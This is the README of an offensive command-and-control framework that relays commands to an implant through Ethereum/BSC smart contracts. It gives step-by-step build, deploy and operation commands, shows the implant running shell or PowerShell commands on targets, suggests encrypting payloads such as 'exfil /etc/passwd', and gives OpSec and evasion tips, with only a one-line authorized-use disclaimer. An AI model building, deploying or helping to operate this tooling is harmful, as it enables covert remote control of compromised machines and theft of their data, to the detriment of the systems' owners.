# C2 via Blockchain Smart Contract 

**A command-and-control framework that uses Ethereum/BSC smart contracts as the C2 channel. No dedicated server needed — just a blockchain RPC endpoint.**

```
┌─────────────┐     ┌──────────────────┐     ┌─────────────┐
│  Operator    │────▶│  Smart Contract  │◀────│   Implant   │
│  (server)    │     │  (C2Controller)  │     │   (client)  │
│              │     │                  │     │             │
│  issues cmd  │     │  commands +      │     │  polls cmd  │
│  via tx      │     │  results stored  │     │  via RPC    │
│              │     │  on-chain        │     │  (free)     │
│              │     │                  │     │  executes   │
│              │     │                  │     │  submits    │
│              │     │                  │     │  result (tx)│
└─────────────┘     └──────────────────┘     └─────────────┘
```

**Reads are free (no gas).** Implants poll commands via `eth_call` — entirely free. Only writes (issuing commands, submitting results) consume gas.

---

## Architecture

### Smart Contract (`contracts/C2Controller.sol`)

Solidity ^0.8 contract using OpenZeppelin's `Ownable`:

- **`issueCommand(implantID, command)`** — Issue a command to a specific implant
- **`getCommand(implantID, commandID)`** — Read a command (free, `view`)
- **`getActiveCommands(implantID)`** — List all pending command IDs (free)
- **`getLatestCommand(implantID)`** — Get the most recent command (free)
- **`submitResult(implantID, commandID, result)`** — Submit execution output
- **`getResult(resultID)`** — Read a submitted result (free)
- **`setOperator(address, bool)`** — Manage operator accounts (owner only)

Events: `CommandIssued`, `ResultSubmitted`, `OperatorUpdated`

### Server (`cmd/server/main.go`)

Operator-side CLI tool. Commands:

| Command | Description |
|---------|-------------|
| `deploy` | Deploy the contract to any EVM chain |
| `exec` | Issue a command to an implant |
| `results` | Read submitted results |
| `add-op` | Add a new operator account |
| `watch` | Live-tail events from the contract |

### Client (`cmd/client/main.go`)

Implant that runs on the target system. Features:

- Polls for commands via free RPC calls
- Jittered polling (configurable interval + jitter)
- Executes commands via shell (`/bin/sh -c` or `powershell.exe`)
- Submits results to the blockchain
- Tracks seen commands to avoid re-execution
- Graceful shutdown on SIGINT/SIGTERM

---

## Quick Start

### Prerequisites

- Go 1.26+
- A [free Infura or Alchemy account](DEPLOYMENT_WALKTHROUGH.md#3-get-an-rpc-endpoint) for RPC access
- A [wallet with testnet ETH](DEPLOYMENT_WALKTHROUGH.md#2-get-free-testnet-eth) (for writes)
- [Foundry](https://book.getfoundry.sh/) (optional — for compiling Solidity)

### 1. Clone & Build

```bash
git clone ... c2-blockchain-contract
cd c2-blockchain-contract

# Build both binaries
make build-server
make build-client

# Or build individually
go build -o bin/server ./cmd/server/
go build -o bin/client ./cmd/client/
```

### 2. Deploy the Contract

See full walkthrough in [DEPLOYMENT_WALKTHROUGH.md](DEPLOYMENT_WALKTHROUGH.md).

Short version:

```bash
# Compile with Foundry & export ABI/bytecode
forge build
forge inspect C2Controller abi > contracts/C2Controller.abi
forge inspect C2Controller bytecode > contracts/C2Controller.bin

# Embed the bytecode (update cmd/server/main.go)
# Then build and deploy
./bin/server deploy https://sepolia.infura.io/v3/YOUR_KEY 0xYOUR_PRIVATE_KEY
```

Or use Remix IDE in a browser — no toolchain needed.

### 3. Run the Implant

```bash
export ETH_RPC_URL=https://sepolia.infura.io/v3/YOUR_KEY
export CONTRACT_ADDR=0xDEPLOYED_CONTRACT_ADDRESS
export PRIVATE_KEY=0xIMPLANT_WALLET_PRIVATE_KEY

./bin/client --interval 15 --jitter 5
```

### 4. Issue Commands

```bash
./bin/server exec \
  https://sepolia.infura.io/v3/YOUR_KEY \
  0xOPERATOR_KEY \
  0xCONTRACT_ADDRESS \
  $(echo -n implant-id | xxd -p -c 64) \
  "whoami"
```

### 5. Read Results

```bash
./bin/server results https://sepolia.infura.io/v3/YOUR_KEY 0xCONTRACT_ADDRESS --limit 10
```

---

## Configuration

### Environment Variables

| Variable | Purpose | Example |
|----------|---------|---------|
| `ETH_RPC_URL` | RPC endpoint | `https://sepolia.infura.io/v3/abc` |
| `CONTRACT_ADDR` | Deployed contract | `0x1234567890abcdef...` |
| `PRIVATE_KEY` | Wallet private key | `0xdeadbeefcafe...` |

### Client Flags

| Flag | Default | Description |
|------|---------|-------------|
| `--interval` | 15s | Poll interval |
| `--jitter` | 5s | Random jitter added to interval |
| `--rpc` | env | RPC URL override |
| `--contract` | env | Contract address override |
| `--key` | env | Private key override |

---

## OpSec Considerations

- **Everything on-chain is public.** Commands and results are visible to anyone reading the contract. Encrypt payloads if secrecy is needed (e.g., base64 + XOR, or AEAD before submission).
- **Anyone can submit results** for any command. The implant authenticates by having the wallet private key, but the contract doesn't enforce which address submits a result.
- **Implant ID is a hash** of `hostname|username|mac|arch`. This is deterministic but not secret. An analyst can see which hosts are calling in.
- **Gas costs** for result submission reveal the implant's wallet address. Consider using an ephemeral wallet per session.
- **The operator wallet** has control. Use a dedicated wallet, not your main one.

### Encryption (Recommended for Sensitive Ops)

Before calling `issueCommand`, encrypt your payload:

```bash
# Encrypt command
echo "exfil /etc/passwd" | openssl enc -aes-256-cbc -pass pass:sharedsecret -a

# Decrypt on implant (via shell pipeline)
# The implant sees the encrypted blob, pipes it through openssl
```

---

## Cross-Compilation

```bash
# Linux amd64 (most common for C2 infrastructure)
make build-client-linux-amd64

# ARM64 (Raspberry Pi, cloud ARM instances)
make build-client-linux-arm64

# Windows
make build-client-windows-amd64

# macOS
make build-client-darwin-amd64
```

---

## File Structure

```
c2-blockchain-contract/
├── contracts/
│   └── C2Controller.sol          # Solidity smart contract
├── cmd/
│   ├── server/
│   │   └── main.go               # Operator CLI tool
│   └── client/
│       └── main.go               # Implant binary
├── DEPLOYMENT_WALKTHROUGH.md     # End-to-end deployment guide
├── README.md                     # This file
├── Makefile                      # Build automation
└── go.mod                        # Go module definition
```

---

## DISCLAIMER

For authorized Security Testing or Educational Purposes only.
